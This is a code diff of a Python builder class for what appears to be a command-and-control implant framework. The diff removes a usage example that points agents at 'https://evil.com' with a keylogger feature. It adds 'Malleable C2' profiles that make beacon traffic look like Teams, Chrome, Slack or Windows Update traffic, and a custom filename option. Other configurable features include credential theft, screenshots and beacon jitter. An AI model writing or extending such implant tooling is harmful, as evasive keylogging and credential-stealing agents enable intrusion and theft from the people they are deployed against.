@@ -1,23 +1,7 @@
 """
 Agent Builder - BUILDER PATTERN
 
-Constructs agents with many optional configurations.
-
-Why Builder Pattern?
-- Too many parameters for constructor
-- Makes configuration readable
-- Easy to add new options
-
-Usage:
-    builder = AgentBuilder()
-    config = (builder
-        .set_platform("windows")
-        .set_c2_server("https://evil.com")
-        .add_feature("keylogger")
-        .enable_encryption()
-        .set_beacon(sleep_time=60, jitter=0.2)
-        .build()
-    )
+Constructs agents with many optional configurations including Malleable C2 profiles.
 """
 
 from typing import List, Optional, Dict, Any
@@ -32,7 +16,6 @@ class AgentBuilder:
     Builder for agent configuration.
     
     Step-by-step agent configuration with fluent interface.
-    Each method returns self, allowing method chaining.
     """
     
     def __init__(self):
@@ -44,6 +27,7 @@ class AgentBuilder:
             
             # Agent identification
             "agent_id": str(uuid.uuid4())[:8],
+            "custom_name": None,
             
             # Features
             "features": [],
@@ -58,9 +42,10 @@ class AgentBuilder:
             
             # Communication
             "protocol": "http",
+            "profile": "chrome_browser",  # ← ADDED: Malleable C2 profile
             
             # Output
-            "output_format": "python",  # or "exe" (requires PyInstaller)
+            "output_format": "python",
         }
     
     # ============================================
@@ -68,28 +53,12 @@ class AgentBuilder:
     # ============================================
     
     def set_platform(self, platform: str) -> 'AgentBuilder':
-        """
-        Set target platform.
-        
-        Args:
-            platform: 'windows', 'linux', or 'macos'
-        
-        Returns:
-            self (for method chaining)
-        """
+        """Set target platform."""
         self._config["platform"] = platform
         return self
     
     def set_c2_server(self, server_url: str) -> 'AgentBuilder':
-        """
-        Set C2 server URL.
-        
-        Args:
-            server_url: Full URL (e.g., 'https://evil.com/api/v1/agents')
-        
-        Returns:
-            self
-        """
+        """Set C2 server URL."""
         self._config["c2_server"] = server_url
         return self
     
@@ -98,12 +67,13 @@ class AgentBuilder:
     # ============================================
     
     def set_agent_id(self, agent_id: str) -> 'AgentBuilder':
-        """
-        Set custom agent ID.
-        
-        If not set, a random ID is generated.
-        """
+        """Set custom agent ID."""
         self._config["agent_id"] = agent_id
+        return self
+    
+    def set_custom_name(self, name: str) -> 'AgentBuilder':
+        """Set custom filename (without extension)."""
+        self._config["custom_name"] = name
         return self
     
     # ============================================
@@ -111,29 +81,13 @@ class AgentBuilder:
     # ============================================
     
     def add_feature(self, feature: str) -> 'AgentBuilder':
-        """
-        Add a feature to the agent.
-        
-        Args:
-            feature: 'keylogger', 'screenshot', 'credentials', etc.
-        
-        Returns:
-            self
-        """
+        """Add a feature to the agent."""
         if feature not in self._config["features"]:
             self._config["features"].append(feature)
         return self
     
     def add_features(self, features: List[str]) -> 'AgentBuilder':
-        """
-        Add multiple features at once.
-        
-        Args:
-            features: List of feature names
-        
-        Returns:
-            self
-        """
+        """Add multiple features at once."""
         for feature in features:
             self.add_feature(feature)
         return self
@@ -149,22 +103,26 @@ class AgentBuilder:
     # ============================================
     
     def set_beacon(self, sleep_interval: int, jitter: float = 0.0) -> 'AgentBuilder':
+        """Configure beacon behavior."""
+        self._config["sleep_interval"] = sleep_interval
+        self._config["jitter"] = jitter
+        return self
+    
+    # ============================================
+    # COMMUNICATION PROFILE (MALLEABLE C2)
+    # ============================================
+    
+    def set_profile(self, profile_name: str) -> 'AgentBuilder':
         """
-        Configure beacon behavior.
+        Set Malleable C2 communication profile.
         
         Args:
-            sleep_interval: Time between beacons (seconds)
-            jitter: Random variation (0.0 to 1.0)
-        
-        Example:
-            .set_beacon(sleep_interval=60, jitter=0.2)
-            # Agent beacons every 48-72 seconds (60 ± 20%)
+            profile_name: Profile name (microsoft_teams, chrome_browser, slack, windows_update)
         
         Returns:
             self
         """
-        self._config["sleep_interval"] = sleep_interval
-        self._config["jitter"] = jitter
+        self._config["profile"] = profile_name
         return self
     
     # ============================================
@@ -172,15 +130,7 @@ class AgentBuilder:
     # ============================================
     
     def enable_encryption(self, key: Optional[str] = None) -> 'AgentBuilder':
-        """
-        Enable encryption for agent communications.
-        
-        Args:
-            key: Encryption key (generated if not provided)
-        
-        Returns:
-            self
-        """
+        """Enable encryption for agent communications."""
         self._config["encryption_enabled"] = True
         if key:
             self._config["encryption_key"] = key
@@ -202,15 +152,7 @@ class AgentBuilder:
     # ============================================
     
     def set_output_format(self, format: str) -> 'AgentBuilder':
-        """
-        Set output format.
-        
-        Args:
-            format: 'python' or 'exe'
-        
-        Returns:
-            self
-        """
+        """Set output format (python or exe)."""
         self._config["output_format"] = format
         return self
     
@@ -222,14 +164,7 @@ class AgentBuilder:
         """
         Build and return the final configuration.
         
-        Validates configuration and returns a dictionary
-        that can be used to generate the agent.
-        
-        Returns:
-            Configuration dictionary
-        
-        Raises:
-            ValueError: If required fields are missing
+        Validates configuration and returns a dictionary.
         """
         
         # Validate required fields
@@ -258,13 +193,17 @@ class AgentBuilder:
         if not 0 <= self._config["jitter"] <= 1:
             raise ValueError("Jitter must be between 0 and 1")
         
+        # Validate profile
+        from app.services.communication.profiles import AVAILABLE_PROFILES
+        if self._config["profile"] not in AVAILABLE_PROFILES:
+            raise ValueError(
+                f"Invalid profile: {self._config['profile']}. "
+                f"Available: {', '.join(AVAILABLE_PROFILES.keys())}"
+            )
+        
         # Return a copy of the configuration
         return self._config.copy()
     
     def get_config(self) -> Dict[str, Any]:
-        """
-        Get current configuration without validation.
-        
-        Useful for previewing configuration before building.
-        """
+        """Get current configuration without validation."""
         return self._config.copy()
